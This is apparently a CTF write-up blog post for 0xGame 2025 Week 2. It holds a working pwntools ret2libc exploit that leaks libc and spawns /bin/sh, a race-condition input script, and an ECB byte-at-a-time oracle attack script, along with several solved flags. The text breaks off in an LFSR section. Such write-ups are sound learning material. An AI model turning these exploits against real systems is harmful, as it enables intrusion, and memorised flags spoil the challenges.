<!DOCTYPE html><html lang="-en -zh-CN -zh-TW" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>0xGame Week2 WP | futurefe的碎碎念</title><meta name="author" content="futurefe"><meta name="copyright" content="futurefe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pwnret2libc123456789101112131415161718io&#x3D;remote(&quot;nc1.ctfplus.cn&quot;,30264)main&#x3D;0x40122Dgot&#x3D;0x404018plt&#x3D;0x401070rdi&#x3D;0x40119eret&#x3D;0x40122cio.recvuntil(b&quot;Input something: \n&quot;)payload&#x3D;b&amp;#x">
<meta property="og:type" content="article">
<meta property="og:title" content="0xGame Week2 WP">
<meta property="og:url" content="https://futurefe414.github.io/2025/10/19/0xGame2025Week2WP.html">
<meta property="og:site_name" content="futurefe的碎碎念">
<meta property="og:description" content="pwnret2libc123456789101112131415161718io&#x3D;remote(&quot;nc1.ctfplus.cn&quot;,30264)main&#x3D;0x40122Dgot&#x3D;0x404018plt&#x3D;0x401070rdi&#x3D;0x40119eret&#x3D;0x40122cio.recvuntil(b&quot;Input something: \n&quot;)payload&#x3D;b&amp;#x">
<meta property="og:locale">
<meta property="og:image" content="https://futurefe414.github.io/images/background/%E4%B8%9C%E6%96%B9/01.jpg">
<meta property="article:published_time" content="2025-10-18T16:00:00.000Z">
<meta property="article:modified_time" content="2025-10-19T03:35:05.170Z">
<meta property="article:author" content="futurefe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://futurefe414.github.io/images/background/%E4%B8%9C%E6%96%B9/01.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "0xGame Week2 WP",
  "url": "https://futurefe414.github.io/2025/10/19/0xGame2025Week2WP.html",
  "image": "https://futurefe414.github.io/images/background/%E4%B8%9C%E6%96%B9/01.jpg",
  "datePublished": "2025-10-18T16:00:00.000Z",
  "dateModified": "2025-10-19T03:35:05.170Z",
  "author": [
    {
      "@type": "Person",
      "name": "futurefe",
      "url": "https://futurefe414.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/images/facial.jpg"><link rel="canonical" href="https://futurefe414.github.io/2025/10/19/0xGame2025Week2WP.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: {"limitCount":80,"languages":{"author":"Author: futurefe","link":"Link: ","source":"Source: futurefe的碎碎念","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '0xGame Week2 WP',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://i.loli.net/2019/09/09/5oDRkWVKctx2b6A.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/images/facial.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/images/background/%E4%B8%9C%E6%96%B9/01.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/facial.jpg" alt="Logo"><span class="site-name">futurefe的碎碎念</span></a><a class="nav-page-title" href="/"><span class="site-name">0xGame Week2 WP</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Friends</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">0xGame Week2 WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-18T16:00:00.000Z" title="Created 2025-10-19 00:00:00">2025-10-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-19T03:35:05.170Z" title="Updated 2025-10-19 11:35:05">2025-10-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">io=remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">30264</span>)</span><br><span class="line">main=<span class="number">0x40122D</span></span><br><span class="line">got=<span class="number">0x404018</span></span><br><span class="line">plt=<span class="number">0x401070</span></span><br><span class="line">rdi=<span class="number">0x40119e</span></span><br><span class="line">ret=<span class="number">0x40122c</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input something: \n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(rdi)+p64(got)+p64(plt)+p64(main)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sym=libc.sym.system+base</span><br><span class="line">sh=<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(ret)+p64(rdi)+p64(sh)+p64(sym)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Input something: \n&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>先把libc的基址找出来，然后再构造ROP链。</p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io=remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="number">32640</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>得到<code>0xGame&#123;Thr3@ds_c@nn0t_b3_w1th0ut_l0cks&#125;</code></p>
<h2 id="高数😫😫"><a href="#高数😫😫" class="headerlink" title="高数😫😫"></a>高数😫😫</h2><p><img src="/images/wp/eval.png" alt="eval"></p>
<p>这个<strong>条件</strong>和<strong>循环</strong>结构够我学一辈子😭😭</p>
<p>flag：<code>0xGame&#123;Ur_@n_excel1ent_bl@ster&#125;</code></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Orcale"><a href="#Orcale" class="headerlink" title="Orcale"></a>Orcale</h2><p>爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 连接信息 ---</span></span><br><span class="line">HOST = <span class="string">&#x27;nc1.ctfplus.cn&#x27;</span></span><br><span class="line">PORT = <span class="number">49725</span></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- I/O 辅助函数 ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_until</span>(<span class="params">s, delim</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从 socket 中接收数据，直到遇到指定的分隔符 delim。&quot;&quot;&quot;</span></span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> data.endswith(delim):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk:  <span class="comment"># 连接已关闭</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            data += chunk</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Socket timeout.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_encryption</span>(<span class="params">s, payload_hex</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在一个已建立的 socket 连接上，发送一次加密请求并获取结果。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 回答 &#x27;y&#x27; 继续加密</span></span><br><span class="line">        s.sendall(<span class="string">b&#x27;y\n&#x27;</span>)</span><br><span class="line">        recv_until(s, <span class="string">b&#x27;[-] Plaintext(in hex):&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. 发送我们的 payload</span></span><br><span class="line">        s.sendall(payload_hex.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 3. 解析返回的密文</span></span><br><span class="line">        recv_until(s, <span class="string">b&#x27;[+] Ciphertext: &#x27;</span>)</span><br><span class="line">        response_line = recv_until(s, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> response_line:</span><br><span class="line">            <span class="keyword">return</span> response_line.strip().decode()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> (socket.error, BrokenPipeError):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Network error occurred during communication.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 主攻击逻辑 ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    执行 ECB 逐字节攻击的主函数。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 建立一个持久连接</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        <span class="comment"># 清理掉第一个 &quot;Continue?&quot; 提示</span></span><br><span class="line">        recv_until(s, <span class="string">b&#x27;y/[n])?&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to connect to <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>. Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    known_flag = <span class="string">b&#x27;0xGame&#123;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Starting ECB byte-at-a-time attack with known prefix: <span class="subst">&#123;known_flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> known_flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>):</span><br><span class="line">            <span class="comment"># 1. 对齐步骤 (Alignment)</span></span><br><span class="line">            <span class="comment"># 构造填充物 (padding)，其长度能让下一个未知字节恰好落在16字节块的末尾</span></span><br><span class="line">            <span class="comment"># 例如，当 known_flag 长度为7时, 我们需要 15-7=8 个 &#x27;A&#x27;</span></span><br><span class="line">            padding_len = (BLOCK_SIZE - <span class="number">1</span>) - (<span class="built_in">len</span>(known_flag) % BLOCK_SIZE)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * padding_len</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 发送这个对齐用的 payload，获取目标密文</span></span><br><span class="line">            <span class="comment"># 服务器会加密: pad(padding + flag, 16)</span></span><br><span class="line">            response_hex = get_encryption(s, padding.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response_hex:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to get response from oracle during alignment.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 我们感兴趣的密文块，是包含第一个未知字节的那一块</span></span><br><span class="line">            <span class="comment"># 它的索引可以通过 (padding长度 + 已知flag长度) / 16 来计算</span></span><br><span class="line">            target_block_index = (<span class="built_in">len</span>(padding) + <span class="built_in">len</span>(known_flag)) // BLOCK_SIZE</span><br><span class="line">            start_pos = target_block_index * BLOCK_SIZE * <span class="number">2</span>  <span class="comment"># 1字节=2个hex字符</span></span><br><span class="line">            end_pos = start_pos + (BLOCK_SIZE * <span class="number">2</span>)</span><br><span class="line">            target_block = response_hex[start_pos:end_pos]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 2. 爆破步骤 (Brute-force)</span></span><br><span class="line">            found_char = <span class="literal">False</span></span><br><span class="line">            <span class="comment"># 优先尝试常见的 flag 字符集</span></span><br><span class="line">            charset = (string.ascii_letters + string.digits + <span class="string">&quot;_-!&#123;&#125;?@#$&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> char_code <span class="keyword">in</span> charset:</span><br><span class="line">                guess_char = <span class="built_in">bytes</span>([char_code])</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 构造测试 payload: padding + known_flag + guess</span></span><br><span class="line">                <span class="comment"># 服务器会加密: pad(padding + known_flag + guess + rest_of_flag, 16)</span></span><br><span class="line">                <span class="comment"># 这个构造使得 (padding + known_flag + guess) 组成一个或多个完整的块</span></span><br><span class="line">                test_payload = padding + known_flag + guess_char</span><br><span class="line">                </span><br><span class="line">                test_response_hex = get_encryption(s, test_payload.<span class="built_in">hex</span>())</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> test_response_hex:</span><br><span class="line">                    <span class="comment"># 如果单次请求失败，跳过这个字符，避免程序崩溃</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># 提取相同位置的密文块进行比较</span></span><br><span class="line">                test_block = test_response_hex[start_pos:end_pos]</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> test_block == target_block:</span><br><span class="line">                    known_flag += guess_char</span><br><span class="line">                    <span class="comment"># 使用 &#x27;ignore&#x27; 以避免非UTF-8字符打印时出错</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] Found: &#x27;<span class="subst">&#123;guess_char.decode(<span class="string">&#x27;latin-1&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&#x27;  -&gt;  Flag: <span class="subst">&#123;known_flag.decode(<span class="string">&#x27;latin-1&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">                    found_char = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[-] Attack failed. Could not find the next character in the charset.&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line">        <span class="keyword">if</span> known_flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Success! Full flag found: <span class="subst">&#123;known_flag.decode(<span class="string">&#x27;latin-1&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Attack stopped. Partial flag: <span class="subst">&#123;known_flag.decode(<span class="string">&#x27;latin-1&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve()</span><br></pre></td></tr></table></figure>

<p>得到<code>0xGame&#123;5679df1b-4bae-4715-8433-4d52ccb258ef&#125;</code></p>
<h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><p>线性反馈移位寄存器。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span 